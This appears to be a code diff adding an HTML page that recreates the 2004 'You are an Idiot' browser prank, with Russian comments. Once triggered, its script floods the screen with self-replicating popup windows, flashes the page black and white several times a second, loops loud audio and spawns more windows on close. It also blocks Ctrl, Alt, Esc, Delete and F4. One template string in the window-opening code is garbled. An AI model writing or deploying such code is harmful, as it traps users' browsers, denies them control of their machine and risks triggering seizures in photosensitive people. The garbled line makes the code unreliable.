@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>You are an Idiot!</title>
+<meta charset="utf-8">
+<style>
+  * { margin: 0; padding: 0; box-sizing: border-box; }
+  html, body {
+    width: 100%;
+    height: 100%;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+    background: #000;
+    color: #fff;
+  }
+
+  /* ===== Стартовый экран ===== */
+  #start-screen {
+    width: 100%;
+    height: 100%;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    background: #111;
+    z-index: 100;
+  }
+
+  #start-screen h1 {
+    font-size: 48px;
+    margin-bottom: 15px;
+  }
+
+  #start-screen p {
+    font-size: 17px;
+    color: #999;
+    margin-bottom: 45px;
+    max-width: 420px;
+    line-height: 1.5;
+  }
+
+  #continue-btn {
+    padding: 16px 50px;
+    font-size: 20px;
+    font-weight: bold;
+    background: #fff;
+    color: #000;
+    border: none;
+    border-radius: 6px;
+    cursor: pointer;
+    transition: 0.15s;
+  }
+
+  #continue-btn:hover {
+    background: #ff0;
+    transform: scale(1.07);
+  }
+
+  /* Невидимая 1×1 кнопка */
+  #tiny-btn {
+    position: absolute;
+    width: 1px;
+    height: 1px;
+    opacity: 0;
+    top: 0;
+    left: 0;
+    z-index: 9999;
+  }
+
+  /* ===== Скример ===== */
+  #screamer {
+    display: none;
+    position: fixed;
+    inset: 0;
+    z-index: 99999;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    text-align: center;
+    background: #000;
+    color: #fff;
+  }
+
+  /* Жёсткое мерцание */
+  #screamer.flashing {
+    animation: hardFlash 0.22s infinite steps(2);
+  }
+
+  @keyframes hardFlash {
+    0%   { background: #000; color: #fff; filter: invert(0); }
+    50%  { background: #fff; color: #000; filter: invert(0); }
+    100% { background: #000; color: #fff; filter: invert(0); }
+  }
+
+  #screamer h1 {
+    font-family: "Times New Roman", Times, serif;
+    font-size: 9vw;
+    font-weight: normal;
+    margin-bottom: 40px;
+    letter-spacing: 3px;
+  }
+
+  .faces {
+    display: flex;
+    gap: 60px;
+    font-size: 11vw;
+  }
+
+  .face {
+    width: 1.2em;
+    height: 1.2em;
+    border: 0.09em solid currentColor;
+    border-radius: 50%;
+    position: relative;
+  }
+
+  .face::before, .face::after {
+    content: "";
+    position: absolute;
+    width: 0.25em;
+    height: 0.25em;
+    background: currentColor;
+    border-radius: 50%;
+    top: 0.3em;
+  }
+
+  .face::before { left: 0.28em; }
+  .face::after  { right: 0.28em; }
+
+  .face span {
+    position: absolute;
+    bottom: 0.25em;
+    left: 50%;
+    transform: translateX(-50%);
+    width: 0.55em;
+    height: 0.28em;
+    border-bottom: 0.09em solid currentColor;
+    border-radius: 0 0 50% 50%;
+  }
+</style>
+</head>
+<body>
+
+<!-- Стартовый экран -->
+<div id="start-screen">
+  <h1>You are an Idiot!</h1>
+  <p>Классический прикол 2004 года.<br>Нажми Continue, чтобы продолжить.</p>
+  <button id="continue-btn">Continue</button>
+</div>
+
+<!-- Невидимая 1×1 кнопка -->
+<button id="tiny-btn"></button>
+
+<!-- Скример -->
+<div id="screamer">
+  <h1>YOU ARE AN IDIOT</h1>
+  <div class="faces">
+    <div class="face"><span></span></div>
+    <div class="face"><span></span></div>
+    <div class="face"><span></span></div>
+  </div>
+</div>
+
+<audio id="audio" loop>
+  <source src="https://www.myinstants.com/media/sounds/you-are-an-idiot.mp3" type="audio/mpeg">
+</audio>
+
+<script>
+  const startScreen = document.getElementById("start-screen");
+  const screamer = document.getElementById("screamer");
+  const audio = document.getElementById("audio");
+  const continueBtn = document.getElementById("continue-btn");
+  const tinyBtn = document.getElementById("tiny-btn");
+
+  let started = false;
+
+  // Проверяем, открыто ли окно уже в режиме вируса
+  const isVirusMode = location.search.includes("virus=1") || location.hash === "#virus";
+
+  // ===== Спавн окон (уже с режимом вируса) =====
+  function spawn(count = 4) {
+    for (let i = 0; i < count; i++) {
+      const left = Math.floor(Math.random() * (screen.availWidth - 320));
+      const top  = Math.floor(Math.random() * (screen.availHeight - 240));
+
+      // Важно: открываем сразу с ?virus=1
+      const w = window.open(
+        location.pathname + "?virus=1",
+        "_blank",
+        `width=280,height=200,left=\( {left},top= \){top},menubar=no,toolbar=no,location=no,status=no,resizable=no`
+      );
+      if (w) {
+        try { w.focus(); } catch(e) {}
+      }
+    }
+  }
+
+  // ===== Запуск скримера =====
+  function startPrank() {
+    if (started) return;
+    started = true;
+
+    startScreen.style.display = "none";
+    screamer.style.display = "flex";
+    screamer.classList.add("flashing");   // включаем жёсткое мерцание
+
+    audio.volume = 1;
+    audio.play().catch(() => {});
+
+    // сразу пачка окон
+    spawn(7);
+
+    // быстрый спам через 1×1 кнопку
+    setInterval(() => {
+      tinyBtn.click();
+      spawn(2);
+    }, 80);
+
+    setInterval(() => spawn(3), 600);
+
+    window.onbeforeunload = () => {
+      spawn(10);
+      return "You are an idiot!";
+    };
+
+    document.body.onclick = () => spawn(5);
+    document.body.onmousemove = () => {
+      if (Math.random() > 0.88) spawn(2);
+    };
+
+    document.onkeydown = (e) => {
+      if ([17, 18, 27, 46, 115].includes(e.keyCode)) {
+        e.preventDefault();
+        alert("YOU ARE AN IDIOT");
+        spawn(6);
+      }
+    };
+  }
+
+  // Если страница открыта уже с ?virus=1 — сразу запускаем
+  if (isVirusMode) {
+    startPrank();
+  }
+
+  // Кнопка Continue
+  continueBtn.addEventListener("click", startPrank);
+
+  // 1×1 кнопка
+  tinyBtn.addEventListener("click", () => {
+    if (!started) startPrank();
+    else spawn(3);
+  });
+</script>
+</body>
+  </html>
